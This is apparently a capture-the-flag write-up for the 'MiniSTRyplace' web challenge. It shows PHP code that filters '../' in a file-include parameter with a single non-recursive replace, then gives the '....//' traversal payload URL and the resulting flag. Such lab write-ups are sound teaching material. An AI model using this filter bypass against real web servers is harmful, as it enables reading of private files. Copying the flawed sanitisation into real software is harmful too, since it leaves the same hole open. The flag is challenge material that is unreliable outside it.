---
title: MiniSTRyplace
date: 2021-04-25 14:03:00 +0200
categories: [web]
tags: [cyberapocalpyse2021]
toc: false
---

This challenge contains a LFI vulnerability. You can read more about it in this [article](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601/). (\* ^ ω ^)

The webpage looks like this:
![](/assets/img/miniSTRyplace_web.png#center)

## Vulnerability
Let's take a look at the index file `index.php`:

```php
<html>
    <header>
        <meta name='author' content='bertolis, makelaris'>
        <title>Ministry of Defence</title>
        <link rel="stylesheet" href="/static/css/main.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
    </header>

    <body>
    <div class="language">
        <a href="?lang=en.php">EN</a>
        <a href="?lang=qw.php">QW</a>
    </div>

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html>
```

We can see it checks if the param `lang` is given and if so it replaces “../” with a blank character.  If we submit “....//”, it becomes “../” allowing path traversal and access to the flag.

## Exploitation
With that knowledge we just visit http://[DOCKER-IP]/?lang=....//....//....//flag and read the flag:

> CHTB{b4d_4li3n_pr0gr4m1ng}

٩(◕‿◕｡)۶